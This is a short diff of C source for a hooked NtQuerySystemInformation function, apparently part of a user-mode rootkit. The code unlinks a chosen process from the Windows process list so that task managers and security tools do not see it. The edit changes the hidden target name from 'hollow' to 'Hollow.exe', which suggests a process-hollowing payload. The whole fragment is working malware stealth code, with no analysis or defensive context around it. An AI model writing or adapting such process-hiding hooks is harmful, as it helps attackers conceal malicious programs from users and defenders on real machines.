@@ -53,7 +53,7 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
 			pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset); 
 
 			//We check the next placeholder
-			if (!wcsncmp(pNext->ImageName.Buffer, L"hollow", pNext->ImageName.Length)) {
+			if (!wcsncmp(pNext->ImageName.Buffer, L"Hollow.exe", pNext->ImageName.Length)) {
 				if (!pNext->NextEntryOffset)
 					pCurrent->NextEntryOffset = 0; //When we find the program that we want, we set to 0 the value to exit from the loop 
 				else
